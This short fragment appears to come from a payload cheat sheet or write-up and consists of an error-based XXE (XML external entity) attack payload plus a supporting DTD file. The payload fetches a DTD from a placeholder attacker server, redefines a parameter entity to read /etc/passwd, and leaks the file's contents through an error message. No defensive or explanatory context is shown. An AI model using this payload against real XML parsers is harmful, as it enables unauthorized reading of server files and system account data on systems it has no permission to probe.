<b>Payload:</b>
```xml
<?xml version=\"1.0\"?>
<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"http://{Attacker_server}/test.dtd\">
<!ENTITY % condition 'aaa)><!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">
<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">&#x25;eval;&#x25;error;<!ELEMENT aa (bb'>%local_dtd;]>
```
<b>DTD File:</b>
```xml
<!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">
<!ELEMENT pattern (%condition;)>
```
